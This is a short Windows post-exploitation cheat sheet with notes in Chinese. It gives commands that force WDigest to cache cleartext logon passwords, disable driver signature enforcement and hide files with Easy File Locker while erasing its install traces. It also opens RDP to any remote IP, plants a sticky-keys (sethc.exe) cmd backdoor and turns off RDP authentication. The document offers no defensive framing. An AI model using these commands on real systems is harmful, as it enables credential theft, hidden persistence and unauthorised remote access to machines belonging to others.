reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f


！！ 禁止强制签名，以管理员的身份运行cmd 执行以下命令  
 
 Win2012 Can: 

bcdedit.exe /set nointegritychecks on  

\\Easy File Locker  （！！！注意：只需要赋予Access权限，其他都不需要，切记切记）


删除1.   REG delete "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\Easy file Locker" /f

删除2：安装目录

删除3： C:\Users\master\AppData\Roaming\Microsoft\Windows\Start Menu\Programs   （快捷方式）


C:/Users/Public/Documents/EFL/rule.ini  隐藏的定义在此
Easy File Locker添加需要隐藏的文件，只赋予access权限，即可实现文件的隐藏。


cmd.exe /c reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /t REG_DWORD /v portnumber /d 3389 /f 


cmd.exe /c wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1


cmd.exe /c netsh advfirewall firewall add rule name="RemoteDesktop_Allow" dir=in protocol=TCP action=allow localport=3389 remoteip=any


1.reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /t REG_DWORD /v portnumber /d 3389 /f   \\配置端口为3389


2.wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1  （open terminal, 0 close)


3. netsh advfirewall firewall add rule name="RemoteDesktop_Allow" dir=in protocol=TCP action=allow localport=3389 remoteip=any


4.netsh advfirewall firewall show rule name="RemoteDesktop_Allow"  


5. netsh advfirewall firewall del rule name="RemoteDesktop_Allow"


reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v "Debugger" /t REG_SZ /d "\"c:\windows\system32\cmd.exe\" /z" /f

REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f

REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f




